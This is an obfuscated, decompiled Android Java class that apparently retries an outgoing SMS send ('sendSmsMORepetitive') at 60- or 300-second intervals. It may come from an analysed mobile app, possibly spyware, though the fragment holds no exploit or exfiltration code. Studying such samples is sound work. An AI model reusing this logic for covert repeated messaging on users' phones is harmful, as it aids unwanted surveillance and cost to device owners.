package com.network.android.a;

import android.content.Context;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class f implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f47a;
    final /* synthetic */ int b;
    final /* synthetic */ int c;
    final /* synthetic */ int d;

    f(Context context, int i, int i2, int i3) {
        this.f47a = context;
        this.b = i;
        this.c = i2;
        this.d = i3;
    }

    public final void run() {
        try {
            if (c.f(this.f47a)) {
                c.b(this.f47a, this.b);
            } else if (this.c <= 6) {
                c.a(this.f47a, this.b, this.d, 60000);
            } else {
                c.a(this.f47a, this.b, this.d, 300000);
            }
        } catch (Throwable th) {
            a.a("sendSmsMORepetitive Exception- " + th.getMessage(), th);
        }
    }
}
